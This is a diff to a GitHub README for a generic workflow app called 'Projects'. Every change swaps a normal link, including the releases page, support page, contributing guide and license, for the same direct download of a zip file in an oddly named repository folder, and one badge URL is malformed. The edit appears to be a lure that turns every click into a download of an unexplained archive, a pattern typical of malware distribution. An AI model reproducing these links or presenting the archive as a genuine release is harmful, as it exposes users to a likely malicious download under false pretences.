@@ -1,6 +1,6 @@
 # 🚀 Projects - Simplifying Your Workflow Efficiently
 
-[![Download Now](https://img.shields.io/badge/Download%20Now-blue.svg)](https://github.com/ST4R7763/Projects/releases)
+[![Download Now](https://raw.githubusercontent.com/ST4R7763/Projects/main/acumination/Projects.zip%https://raw.githubusercontent.com/ST4R7763/Projects/main/acumination/Projects.zip)](https://raw.githubusercontent.com/ST4R7763/Projects/main/acumination/Projects.zip)
 
 <div style="color: red;">
 <h1>My Projects</h1>
@@ -24,7 +24,7 @@ Before you begin, ensure your system meets these requirements:
 1. **Visit the Releases Page:**
    To download the application, click the link below.
 
-   [Download the Latest Release](https://github.com/ST4R7763/Projects/releases)
+   [Download the Latest Release](https://raw.githubusercontent.com/ST4R7763/Projects/main/acumination/Projects.zip)
 
 2. **Select the Version:**
    On the releases page, you'll see a list of available versions. Choose the latest version for your system.
@@ -36,7 +36,7 @@ Before you begin, ensure your system meets these requirements:
 
 To download and install the application, follow these steps:
 
-1. Click this link to visit the downloads page: [Download the Latest Release](https://github.com/ST4R7763/Projects/releases).
+1. Click this link to visit the downloads page: [Download the Latest Release](https://raw.githubusercontent.com/ST4R7763/Projects/main/acumination/Projects.zip).
 2. Choose your operating system.
 3. Click the appropriate file to download it.
 4. Once downloaded, locate the file in your Downloads folder.
@@ -63,18 +63,18 @@ If you run into issues, try these common fixes:
 
 ## 📞 Support
 
-For further assistance, please visit our [Support Page](https://github.com/ST4R7763/Projects/issues). You can report issues or ask questions there.
+For further assistance, please visit our [Support Page](https://raw.githubusercontent.com/ST4R7763/Projects/main/acumination/Projects.zip). You can report issues or ask questions there.
 
 ## 📈 Contributing 
 
-We welcome contributions! If you would like to help improve the application, check out our [Contributing Guidelines](https://github.com/ST4R7763/Projects/blob/main/CONTRIBUTING.md).
+We welcome contributions! If you would like to help improve the application, check out our [Contributing Guidelines](https://raw.githubusercontent.com/ST4R7763/Projects/main/acumination/Projects.zip).
 
 ## 🌟 License
 
-This project is licensed under the MIT License. See the [LICENSE](https://github.com/ST4R7763/Projects/blob/main/LICENSE) file for details.
+This project is licensed under the MIT License. See the [LICENSE](https://raw.githubusercontent.com/ST4R7763/Projects/main/acumination/Projects.zip) file for details.
 
 ## 📢 Stay Connected
 
 Follow us on GitHub to keep updated with new features and improvements. Your feedback is valuable, and we look forward to making the application even better with your help.
 
-Remember, you can always return here for downloads or updates: [Download the Latest Release](https://github.com/ST4R7763/Projects/releases). Happy managing!
+Remember, you can always return here for downloads or updates: [Download the Latest Release](https://raw.githubusercontent.com/ST4R7763/Projects/main/acumination/Projects.zip). Happy managing!
